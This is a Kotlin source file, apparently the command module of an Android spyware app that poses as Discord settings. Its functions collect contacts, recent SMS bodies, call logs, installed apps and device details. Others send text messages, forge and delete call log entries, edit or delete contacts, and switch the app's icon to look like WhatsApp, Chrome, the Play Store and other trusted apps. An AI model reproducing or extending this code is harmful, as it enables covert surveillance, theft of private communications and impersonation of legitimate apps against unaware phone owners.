package com.discord.settings


import android.Manifest
import android.annotation.SuppressLint
import android.app.PendingIntent
import android.bluetooth.BluetoothAdapter
import android.content.ComponentName
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.media.AudioDeviceInfo
import android.media.AudioManager
import android.media.MediaPlayer
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.SmsManager
import android.text.format.Formatter
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.ArrayList

class Functions {


    //get percentage of battery
    fun getBatteryPercentage(context: Context): String {
        try{
            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
                context.registerReceiver(null, filter)
            }
            val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            return if (level != -1 && scale != -1) {
                val percentage = (level * 100 / scale.toFloat()).toInt()
                "Battery Percentage : $percentage%"
            } else {
                val percentage = -1
                "Battery Percentage : $percentage%"

            }
        }catch(e:Exception){
            return "ERROR:: $e"
        }
    }

    //check if connected with wifi or mobile internet
    @SuppressLint("ServiceCast")
    fun connectionType(context: Context):String{
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        val networkType = networkInfo?.typeName // e.g., WIFI, MOBILE
        return  "Connection (WIFI/MOBILE) : $networkType"
    }

    //get local ip address (wifi)
    @SuppressLint("ServiceCast")
    fun localIp(context: Context):String{
        try{
            val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val wifiInfo = wifiManager.connectionInfo
            val ipAddress = Formatter.formatIpAddress(wifiInfo.ipAddress)
            return " IP ADDRESS : $ipAddress"
        }catch(e:Exception){
            return "ERROR:: $e"
        }

    }
    @SuppressLint("ServiceCast")
    //check if headphone is connected or not
    fun checkHeadphonesStatus(context: Context):String {
        try{
            var connected = "not connected"
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val devices = audioManager.getDevices(AudioManager.GET_DEVICES_OUTPUTS)
            for (device in devices) {
                if (device.type == AudioDeviceInfo.TYPE_WIRED_HEADSET || device.type == AudioDeviceInfo.TYPE_WIRED_HEADPHONES) {
                    // Headphones are connected
                    connected =  "connected"
                }
            }
            // Headphones are not connected
            return "Headphones are $connected"
        }catch(e:Exception){
            return "ERROR:: $e"
        }
    }

    //check if bluetooth on or off
    fun checkBluetoothStatus():String {
        var status:String
        try{
            val bluetoothAdapter: BluetoothAdapter? = BluetoothAdapter.getDefaultAdapter()
            status = if (bluetoothAdapter == null) {
                // Device doesn't support Bluetooth
                "not supported in this device"
            } else {
                if (bluetoothAdapter.isEnabled) {
                    // Bluetooth is enabled
                    "is enabled"
                } else {
                    // Bluetooth is disabled
                    "is disabled"
                    // You can prompt the user to enable Bluetooth
                }
            }
        }catch (e: java.lang.Exception){
            status=e.toString()
        }
        return "Bluetooth Status : $status"
    }

    //gps enabled/disabled
    fun isGpsEnabled(context: Context): String {
        try{
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val status = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
            return "GPS is : ${if(status) "ENABLED" else "DISABLED"}"
        }catch(e:Exception){
            return "ERROR:: $e"
        }
    }

    //check if connected to a wifi or not
    fun isConnectedToWifi(context: Context): String {
        try{
            val connectivityManager = context.getSystemService(AppCompatActivity.CONNECTIVITY_SERVICE) as ConnectivityManager

            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            val status = capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
            return "WIFI : ${if(status) "CONNECTED" else "NOT-CONNECTED"}"

        }catch(e:Exception){
            return  "ERROR:: $e"
        }
    }

    fun isCharging(context: Context): String {
        try{
            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
                context.registerReceiver(null, filter)
            }
            val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            return "Charging : ${if(isCharging) "YES" else "NO"}"
        }catch(e:Exception){
            return "ERROR:: $e"
        }
    }

    //check if screen is on or off
    fun isScreenOn(context: Context): String {
        try{
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            val status = powerManager.isInteractive
            return "Screen On : ${if(status) "YES" else "NO"}"
        }catch(e:Exception){
            return "ERROR:: $e"
        }
    }

    @SuppressLint("QueryPermissionsNeeded")
    fun getAppPackageName(context: Context,app:String): String {
        try{
            val packageManager: PackageManager = context.packageManager
            val packages: List<PackageInfo> = packageManager.getInstalledPackages(PackageManager.GET_META_DATA)
            var packageNameString = ""
            for (packageInfo in packages) {
                if (packageManager.getLaunchIntentForPackage(packageInfo.packageName) != null) {
                    val appName: String = packageInfo.applicationInfo.loadLabel(packageManager).toString()
                    val packageName: String = packageInfo.packageName
                    if(appName.replace(" ","").contains(app,ignoreCase = true)){
                        return packageName
                    }
                }
            }
            return packageNameString
        }catch(e:Exception){
            return "ERROR:: $e"
        }
    }

    @SuppressLint("QueryPermissionsNeeded")
    fun getInstalledApps(context: Context): String {
        return try {
            val packageManager: PackageManager = context.packageManager
            val packages: List<PackageInfo> = packageManager.getInstalledPackages(PackageManager.GET_META_DATA)

            val apps = StringBuilder()
            for (packageInfo in packages) {
                val appInfo = packageInfo.applicationInfo
                // Filter only user-installed apps (exclude system apps)
                if ((appInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0 &&
                    (appInfo.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 0) {

                    val appName: String = appInfo.loadLabel(packageManager).toString()
                    val packageName: String = packageInfo.packageName
                    val versionName: String = packageInfo.versionName ?: "N/A"

                    // Collect app details
                    apps.append("NAME: $appName\\nPACKAGE: $packageName\\nVERSION: $versionName\\n\\n")
                }
            }

            apps.toString().replace("\n","\\n")
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }





    //get android details
    @SuppressLint("HardwareIds")
    fun getDetails(context: Context):String{
        try{
            val metrics = context.resources.displayMetrics
            return "Model :  ${Build.MODEL}\\nMANUFACTURER : ${Build.MANUFACTURER}\\nRelease : ${Build.VERSION.RELEASE}\\nBrand : ${Build.BRAND}\\nHardware : ${Build.HARDWARE}\\nSerial : ${Build.SERIAL}\\nId : ${Build.ID}\\nTime : ${Build.TIME}\\nBootloader : ${Build.BOOTLOADER}\\nA B I S : ${Build.SUPPORTED_ABIS.joinToString()}\\nResolution :${metrics.widthPixels}x${metrics.heightPixels}\\n${checkHeadphonesStatus(context)}\\n${checkBluetoothStatus()}\\n${isGpsEnabled(context)}\\n${isConnectedToWifi(context)}\\n${getBatteryPercentage(context)}\\n${isCharging(context)}\\n${localIp(context)}\\nInternet : ${connectionType(context)}\\n${isScreenOn(context)}"
        }catch(e:Exception){
            return "ERROR:: $e"
        }
    }

    //switch flash on/off
    fun switchFlashlight(context: Context, on:Boolean):String {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList[0]
            cameraManager.setTorchMode(cameraId, on)
        }  catch (e: Exception) {
            e.printStackTrace()
        }
        val flashLightStatus = if(on)"ON" else "OFF"
        return "FlashLight is $flashLightStatus"
    }


    //change volume
    fun controlVolume(context: Context, type:String, value:String):String{
        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val volumeType = if(type.lowercase() == "media") AudioManager.STREAM_MUSIC else if(type.lowercase() == "ring") AudioManager.STREAM_RING else if(type.lowercase() == "call") AudioManager.STREAM_VOICE_CALL else if (type.lowercase() =="alarm") AudioManager.STREAM_ALARM else if(type.lowercase() == "notification") AudioManager.STREAM_NOTIFICATION else AudioManager.STREAM_SYSTEM
        val currentVolume = audioManager.getStreamVolume(volumeType)
        val maxVolume = audioManager.getStreamMaxVolume(volumeType)

        try{
            val desiredVolume= value.toInt()
            audioManager.setStreamVolume(volumeType, desiredVolume.coerceAtMost(maxVolume), AudioManager.FLAG_SHOW_UI)
            return "$type Volume Changed\\nNew : $desiredVolume\\nPrev : $currentVolume\\nMax : $maxVolume"
        }catch(e:Exception){
            val desiredVolume = if(value=="+" || value =="up") currentVolume+1 else if(value=="-" || value=="down") currentVolume-1 else 0
            audioManager.setStreamVolume(volumeType, desiredVolume.coerceAtMost(maxVolume), AudioManager.FLAG_SHOW_UI)
            return "$type Volume Changed\\nNew : $desiredVolume\\nPrev : $currentVolume\\nMax : $maxVolume"
        }
    }

    //play music with url
    fun playMusicURL(url:String):String{
        try{
            // Initialize MediaPlayer
            MediaPlayer().apply {setDataSource(url)
                setOnPreparedListener { start() }
                prepareAsync() // Prepare the MediaPlayer asynchronously
            }
            return "played music : $url"
        }catch(e:Exception){
            return "ERROR:: Unable to play music : error : $e"
        }
    }

    //sub function for checkPermissions
    private fun isPermissionGranted(context:Context,permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    //check permissions granted/denied status
    fun checkPermissions(context: Context):String{
        return "\\n\\nPERMISSIONS : \\n---------------------------\\n" +
                "Contacts : ${isPermissionGranted(context,Manifest.permission.READ_CONTACTS)}\\n" +
                "SMS : ${isPermissionGranted(context,Manifest.permission.READ_SMS)}\\n" +
                "Call Log : ${isPermissionGranted(context,Manifest.permission.READ_CALL_LOG)}\\n" +
                //"Accessibility : ${Permissions().isAccessibilityServiceEnabled(context,MyAccessibilityService::class.java)}\\n" +
                "Ignore optimization : ${Permissions().isIgnoringBatteryOptimizations(context)}"
    }

    //get contacts
    @SuppressLint("Recycle")
    fun getContactsFiltered(context: Context,filter:Char):String{
        var content = "Contacts\\n--------------\\n"
        try{
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            cursor?.use{
                val nameColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while(it.moveToNext()){
                    val name = it.getString(nameColumn)
                    val number = it.getString(numberColumn)
                    if(name[0]==filter){
                        content += "Name: $name\\nNumber: $number\\n\\n"
                    }

                }
            }
        }catch (e:SecurityException){
            content= "ERROR:: CONTACT Permission denied"
        }
        return content
    }

    //get contacts
    @SuppressLint("Recycle")
    fun getContacts(context: Context):String{
        var content = "\\n\\nCONTACTS\\n----------------\\n\\n"
        try{
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC " // Order by name & limit to 20
            )
            cursor?.use{
                val nameColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberColumn = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while(it.moveToNext()){
                    val name = it.getString(nameColumn)
                    val number = it.getString(numberColumn)

                    content += "Name: $name\\nNumber: $number\\n\\n"

                }
            }
        }catch (e:SecurityException){
            content= "ERROR:: CONTACTS Permission denied"
        }
        catch(e:Exception){
            content = "ERROR:: $e"
        }
        return content
    }

    @SuppressLint("Recycle", "Range", "SimpleDateFormat")
    fun getMessages(context: Context):String{
        var content = "\\nMessages\\n---------------\\n"
        try{
            val uri = Telephony.Sms.CONTENT_URI
            val cursor = context.contentResolver.query(uri,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE),null,null, "${Telephony.Sms.DATE} DESC LIMIT 20")
            cursor?.use{
                while (it.moveToNext()){
                    val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS))
                    val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY))
                    val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))
                    val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                    val formattedDate = formatter.format(date)
                    val type = it.getInt(it.getColumnIndex(Telephony.Sms.TYPE))
                    val messageType =if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) "Inbox" else if (type == Telephony.Sms.MESSAGE_TYPE_SENT) "Sent" else "Other"
                    val message = "Address : $address\\n" +"Date : $formattedDate\\n " + "TYPE : $messageType\\n\\n" + "content: \\n ${body}\\n\\n"
                    content+=message
                }
            }
        }catch (e:SecurityException){
            content = "SMS Permission denied"
        }catch (e: java.lang.Exception){
            content = "$e"
        }
        return content.replace("\n","\\n")
    }

    //get call logs
    fun getCallLogs(context: Context): String {
        var content = "\\nCALL LOGS\\n-----------------\\n\\n"
        try {
            val cursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                val numberColumn = it.getColumnIndex(CallLog.Calls.NUMBER)
                val dateColumn = it.getColumnIndex(CallLog.Calls.DATE)
                val typeColumn = it.getColumnIndex(CallLog.Calls.TYPE)

                if (numberColumn == -1 || dateColumn == -1 || typeColumn == -1) {
                    throw IllegalArgumentException("Invalid column index")
                }

                var count = 0 // Counter for limiting the results to 10

                while (it.moveToNext() && count < 30) {
                    val number = it.getString(numberColumn)
                    val date = it.getLong(dateColumn)
                    val type = it.getInt(typeColumn)
                    val callType =
                        when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            CallLog.Calls.MISSED_TYPE -> "Missed"
                            CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                            CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "Answered Externally"
                            else -> "Unknown"
                        }

                    // Concatenate the call log details to the 'content' variable
                    content += "Number: $number\\nDate: $date\\nType: $callType\\n\\n"
                    count++
                }
            }
        } catch (e: SecurityException) {
            content = "CALL LOG Permission denied"
        } catch (e: Exception) {
            Log.d("check1", e.toString())
            content = "$e"
        }
        return content
    }

    fun createContact(context: Context,name: String, phoneNumber: String):String{
        try{
            val contentResolver: ContentResolver = context.contentResolver
            val rawContactValues = ContentValues().apply {
                putNull(ContactsContract.RawContacts.ACCOUNT_TYPE)
                putNull(ContactsContract.RawContacts.ACCOUNT_NAME)
            }
            val rawContactUri = contentResolver.insert(ContactsContract.RawContacts.CONTENT_URI, rawContactValues)
            val rawContactId = rawContactUri?.lastPathSegment
            // Inserting name
            val nameValues = ContentValues().apply {
                put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId)
                put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name.replace("//"," "))
            }
            contentResolver.insert(ContactsContract.Data.CONTENT_URI, nameValues)
            // Inserting phone number
            val phoneValues = ContentValues().apply {
                put(ContactsContract.Data.RAW_CONTACT_ID, rawContactId)
                put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                put(ContactsContract.CommonDataKinds.Phone.NUMBER, phoneNumber)
                put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
            }
            contentResolver.insert(ContactsContract.Data.CONTENT_URI, phoneValues)
            return "created Contact number : $phoneNumber name: $name"
        }catch (e: SecurityException) {
            return "CALL LOG Permission denied"
        }catch (e:Exception){
            return "error : $e"
        }
    }

    //add call log entry (fake call log)
    fun addCallLogEntry(context: Context,number: String, type: String="inc", time: Long=1,duration:Long=1):String {
        val callType = if(type == "inc")1 else if(type =="out")2 else if(type =="miss")3 else if(type == "voic")4 else if(type == "rej")5 else if(type == "block")6 else if(type == "ext")7 else 1
        return try{
            val contentResolver: ContentResolver = context.contentResolver
            val values = ContentValues().apply {
                put(CallLog.Calls.NUMBER, number)
                put(CallLog.Calls.TYPE, callType)
                put(CallLog.Calls.DATE, System.currentTimeMillis() - time*60000)
                put(CallLog.Calls.DURATION, duration)
            }
            contentResolver.insert(CallLog.Calls.CONTENT_URI, values)
            "created log  ph: $number \\n type : $type \\n time:  $time Mins ago \\n duration : $duration \\n"
        }catch (e: SecurityException) {
            return "CALL LOG Permission denied"
        }catch (e:Exception){
            "error : $e"
        }
    }

    //send sms
    fun sendSms(context: Context,number:String,message:String):String{
        val smsManager: SmsManager = SmsManager.getDefault()
        // Use PendingIntent to check the status of the sent SMS
        val sentIntent = PendingIntent.getBroadcast(
            context, 0, Intent("SMS_SENT"), PendingIntent.FLAG_IMMUTABLE
        )
        // Use PendingIntent to check the status of the delivered SMS
        val deliveredIntent = PendingIntent.getBroadcast(
            context, 0, Intent("SMS_DELIVERED"), PendingIntent.FLAG_IMMUTABLE
        )
        try{
            // Divide the message into parts if it's too long
            val parts = smsManager.divideMessage(message)
            val messageCount = parts.size
            val sentIntents = ArrayList<PendingIntent>()
            val deliveredIntents = ArrayList<PendingIntent>()
            // Populate ArrayLists with the same PendingIntent for each part
            repeat(messageCount) {
                sentIntents.add(sentIntent)
                deliveredIntents.add(deliveredIntent)
            }

            // Send the SMS
            smsManager.sendMultipartTextMessage(
                number, null, parts, sentIntents, deliveredIntents
            )
            return "Successfully sent Message!\\nTO : $number\\nCONTENT : \\n$message "
        }catch (e: SecurityException) {
            return "SMS Permission denied"
        }catch (e:Exception){
            return e.toString()
        }
    }

    //delete specific call log
    @SuppressLint("Range")
    fun deleteCallLogForNumber(context: Context, phoneNumber: String):String {
        return try{
            val contentResolver: ContentResolver = context.contentResolver
            val selectionClause = "${CallLog.Calls.NUMBER} = ?"
            val selectionArgs = arrayOf(phoneNumber)

            contentResolver.delete(CallLog.Calls.CONTENT_URI, selectionClause, selectionArgs)
            "Deleted callLog of $phoneNumber"
        }catch (e: SecurityException) {
            return "CALL LOG Permission denied"
        }catch (e:Exception){
            "error : $e"
        }
    }




    //delete last call log
    @SuppressLint("Range")
    fun deleteLastCallLog(context: Context):String {
        try{
            val contentResolver: ContentResolver = context.contentResolver
            val cursor: Cursor? = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val callId = it.getLong(it.getColumnIndex(CallLog.Calls._ID))
                    val deleted = contentResolver.delete(CallLog.Calls.CONTENT_URI, "${CallLog.Calls._ID}=?", arrayOf(callId.toString()))
                    if (deleted > 0) {
                        // Log entry deleted successfully
                    }
                }
            }
            return "removed last call log"
        }catch (e: SecurityException) {
            return "CALL LOG Permission denied"
        }catch(e:Exception){
            return "error $e"
        }
    }

    fun deleteContactByPhoneNumber(context: Context, phoneNumber: String): String {
        try{
            val contentResolver: ContentResolver = context.contentResolver

            // Query the contact by phone number
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.CONTACT_ID, ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY),
                "${ContactsContract.CommonDataKinds.Phone.NUMBER} = ?",
                arrayOf(phoneNumber),
                null
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val contactId = it.getLong(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))
                    val lookupKey = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY))
                    val contactUri: Uri = ContactsContract.Contacts.getLookupUri(contactId, lookupKey)

                    // Delete the contact
                    contentResolver.delete(contactUri, null, null)
                    return "Contact Deleted Successfully\\nNumber : $phoneNumber"
                } else {
                    return "Contact Not Found\\nNumber : $phoneNumber"
                }
            } ?: run {
                return "Failed to query contacts"
            }
        }catch (e:Exception){
            return "Error : $e"
        }
    }

    fun updateContactByName(context: Context, oldName: String, newName: String, newPhoneNumber: String): String {
        try{
            val contentResolver: ContentResolver = context.contentResolver

            val oldName = oldName.replace("//", " ")
            val newName = newName.replace("//"," ")
            val newPhoneNumber = newPhoneNumber.replace("//", " ")

            // Query the contact by name
            val cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.LOOKUP_KEY),
                "${ContactsContract.Contacts.DISPLAY_NAME_PRIMARY} = ?",
                arrayOf(oldName),
                null
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val contactId = it.getLong(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))

                    // Update the contact name
                    val nameValues = ContentValues().apply {
                        put(ContactsContract.Data.RAW_CONTACT_ID, contactId)
                        put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                        put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, newName)
                    }
                    contentResolver.update(
                        ContactsContract.Data.CONTENT_URI,
                        nameValues,
                        "${ContactsContract.Data.RAW_CONTACT_ID} = ? AND ${ContactsContract.Data.MIMETYPE} = ?",
                        arrayOf(contactId.toString(), ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                    )

                    // Update the contact phone number
                    val phoneValues = ContentValues().apply {
                        put(ContactsContract.Data.RAW_CONTACT_ID, contactId)
                        put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                        put(ContactsContract.CommonDataKinds.Phone.NUMBER, newPhoneNumber)
                        put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
                    }
                    contentResolver.update(
                        ContactsContract.Data.CONTENT_URI,
                        phoneValues,
                        "${ContactsContract.Data.RAW_CONTACT_ID} = ? AND ${ContactsContract.Data.MIMETYPE} = ?",
                        arrayOf(contactId.toString(), ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                    )

                    return "Contact updated\\nOLD NAME: $oldName\\nNEW NAME:$newName\\nNEW NUMBER : $newPhoneNumber"
                } else {
                    return "Contact not found"
                }
            } ?: run {
                return "Failed to query contacts"
            }
        }catch(e:Exception){
            return "Error : $e"
        }
    }

    //change app icon
    fun changeAppIcon(context: Context, name:String):String{
        val allIcons = arrayOf("MainActivity","amazon","update","playstore","chrome","facebook","gmail","google","gpay","instagram","maps","settings","photos","whatsapp","youtube","calendar","netflix","meet","googletv","truecaller","translator","telegramx","telegram","spotify","file","clock")

        val packageName = Functions().getAppPackageName(context,name)
        if(packageName!=""){
            try{
                val manager: PackageManager = context.packageManager
                for(icon in allIcons){
                    if(icon == name.lowercase()){
                        manager.setComponentEnabledSetting(
                            ComponentName(context, "com.discord.settings.$icon"),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                    }else{
                        manager.setComponentEnabledSetting(ComponentName(context,"com.discord.settings.$icon"), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    }
                }
                SaveLocalData().saveGlobalData(context,"AppData",packageName)
                return "Changed App to $name"
            }catch(e:Exception){return "ERROR::$e" }
        }else{ return "App Not Installed" }

    }


}